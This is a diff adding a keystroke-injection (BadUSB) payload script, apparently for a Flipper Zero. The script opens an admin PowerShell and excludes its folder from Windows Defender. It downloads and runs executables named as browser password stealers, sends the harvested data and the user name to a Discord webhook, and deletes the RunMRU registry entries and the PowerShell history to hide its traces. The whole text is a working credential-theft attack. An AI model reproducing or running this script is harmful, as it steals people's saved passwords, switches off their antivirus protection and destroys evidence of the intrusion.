@@ -1,0 +1,104 @@
+REM Open PowerShell As Admin
+GUI r
+DELAY 300
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 1000
+LEFT
+ENTER
+DELAY 300
+
+REM Running payload
+REM Set date and time variables
+STRING Get-Date -Format yyyy-MM-dd >> stats.txt
+ENTER
+STRING Get-Date -Format hh-mm-ss >> stats.txt
+ENTER
+STRING whoami >> stats.txt
+ENTER
+
+REM Get current directory
+STRING $currentDirectory = Get-Location
+ENTER
+
+REM Add directory to Windows Defender exclusion list
+STRING try { Add-MpPreference -ExclusionPath $currentDirectory.Path; } catch { Write-Output 'Failed to add exclusion'; }
+ENTER
+
+REM Download and run chrome.exe
+STRING $chromeExeUrl = 'https://github.com/RiadZX/FlipperPasswordStealer/raw/master/build/chrome.exe'
+ENTER
+STRING $chromeExePath = '.\\chrome.exe'
+ENTER
+STRING if (-not (Test-Path -Path $chromeExePath)) {Invoke-WebRequest -Uri $chromeExeUrl -OutFile $chromeExePath;}
+ENTER
+STRING $chromeOutput = & "$chromeExePath" | Out-String
+ENTER
+STRING $chromeOutput | Out-File -FilePath stats.txt -Append
+ENTER
+STRING Remove-Item $chromeExePath
+ENTER
+DELAY 400
+
+REM Download and run edge.exe
+STRING $edgeExeUrl = 'https://github.com/RiadZX/FlipperPasswordExtractor/raw/master/build/edge.exe'
+ENTER
+STRING $edgeExePath = '.\\edge.exe'
+ENTER
+STRING if (-not (Test-Path -Path $edgeExePath)) {Invoke-WebRequest -Uri $edgeExeUrl -OutFile $edgeExePath;}
+ENTER
+STRING $edgeOutput = & "$edgeExePath" | Out-String
+ENTER
+STRING $edgeOutput | Out-File -FilePath stats.txt -Append
+ENTER
+STRING Remove-Item $edgeExePath
+ENTER
+DELAY 400
+
+REM Define Upload-Discord function
+STRING function Upload-Discord {
+ENTER
+STRING [CmdletBinding()]
+ENTER
+STRING Param(
+ENTER
+STRING [Parameter(Position=0,Mandatory=$False)]
+ENTER
+STRING [string]$file,
+ENTER
+STRING [Parameter(Position=1,Mandatory=$False)]
+ENTER
+STRING [string]$text)
+ENTER
+STRING $hookurl = "<Webhookurl>"
+ENTER
+STRING $Body = @{
+ENTER
+STRING 'username' = $env:username
+ENTER
+STRING 'content' = $text}
+ENTER
+STRING if (-not ([string]::IsNullOrEmpty($text))){
+ENTER
+STRING Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)};
+ENTER
+STRING if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}}
+ENTER
+DELAY 400
+
+REM Upload to webhook
+STRING Upload-Discord -file "stats.txt"
+ENTER
+DELAY 400
+
+REM Deleting traces
+STRING Remove-Item stats.txt
+ENTER
+STRING reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f
+ENTER
+STRING Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+ENTER
+
+REM End script
+STRING exit
+ENTER
